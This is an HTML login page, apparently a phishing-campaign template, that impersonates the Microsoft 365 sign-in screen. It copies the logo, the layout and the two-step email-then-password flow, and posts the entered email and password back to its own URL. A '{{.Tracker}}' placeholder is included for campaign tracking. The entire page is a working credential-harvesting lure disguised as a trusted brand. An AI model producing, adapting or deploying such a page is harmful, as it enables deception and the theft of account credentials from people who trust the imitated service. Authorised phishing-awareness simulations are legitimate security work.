<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: white;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            max-width: 440px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 108px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
            text-align: center;
        }
        .subtitle {
            font-size: 15px;
            color: #323232;
            margin-bottom: 24px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 8px;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 11px 12px;
            font-size: 15px;
            border: 1px solid #8a8886;
            outline: none;
            background-color: white;
        }
        input:focus {
            border-color: #0078d4;
        }
        .checkbox-group {
            margin: 16px 0;
        }
        .checkbox-group label {
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        .checkbox-group input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
        }
        .button {
            width: 100%;
            padding: 11px;
            background-color: #0067b8;
            color: white;
            border: none;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 24px;
        }
        .button:hover {
            background-color: #005a9e;
        }
        .help-links {
            margin-top: 16px;
            text-align: center;
        }
        .help-links a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }
        .help-links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 32px;
            text-align: center;
            font-size: 11px;
            color: #605e5c;
        }
        .footer a {
            color: #605e5c;
            text-decoration: none;
            margin: 0 8px;
        }
        .error-message {
            color: #e81123;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 108 24" fill="#5E5E5E">
                <path d="M44.84 7.4v9.46h-1.4V7.4h1.4zm8.52 0l-3.7 9.46h-1.5l-3.7-9.46h1.5l3 7.9 3-7.9h1.4z"/>
                <path d="M0 0h10.8v10.8H0V0zm12 0h10.8v10.8H12V0zm0 12h10.8v10.8H12V12zM0 12h10.8v10.8H0V12z" fill="#F25022"/>
                <path d="M12 0h10.8v10.8H12V0z" fill="#7FBA00"/>
                <path d="M12 12h10.8v10.8H12V12z" fill="#00A4EF"/>
                <path d="M0 12h10.8v10.8H0V12z" fill="#FFB900"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Microsoft 365</p>
        
        <form method="POST" action="?" id="loginForm">
            <div class="form-group">
                <label for="email">Email, phone, or Skype</label>
                <input type="text" id="email" name="email" required autocomplete="username">
                <div class="error-message" id="emailError">Enter a valid email address</div>
            </div>
            
            <div class="form-group" id="passwordGroup" style="display: none;">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
                <div class="error-message" id="passwordError">Please enter your password</div>
            </div>
            
            <div class="checkbox-group" id="rememberGroup" style="display: none;">
                <label>
                    <input type="checkbox" name="remember" checked>
                    <span>Keep me signed in</span>
                </label>
            </div>
            
            <button type="submit" class="button" id="submitBtn">Next</button>
            
            <div class="help-links">
                <a href="#">Can't access your account?</a>
            </div>
            
            <div class="help-links" style="margin-top: 24px;">
                <a href="#">Sign-in options</a>
            </div>
        </form>
        
        <div class="footer">
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
            <a href="#">...</a>
        </div>
    </div>
    
    <script>
        let emailEntered = false;
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordGroup = document.getElementById('passwordGroup');
        const rememberGroup = document.getElementById('rememberGroup');
        const submitBtn = document.getElementById('submitBtn');
        
        form.addEventListener('submit', function(e) {
            if (!emailEntered && emailInput.value) {
                e.preventDefault();
                emailEntered = true;
                passwordGroup.style.display = 'block';
                rememberGroup.style.display = 'block';
                emailInput.setAttribute('readonly', true);
                emailInput.style.backgroundColor = '#f4f4f4';
                submitBtn.textContent = 'Sign in';
                document.getElementById('password').focus();
            }
        });
    </script>
    
    {{.Tracker}}
</body>
</html>
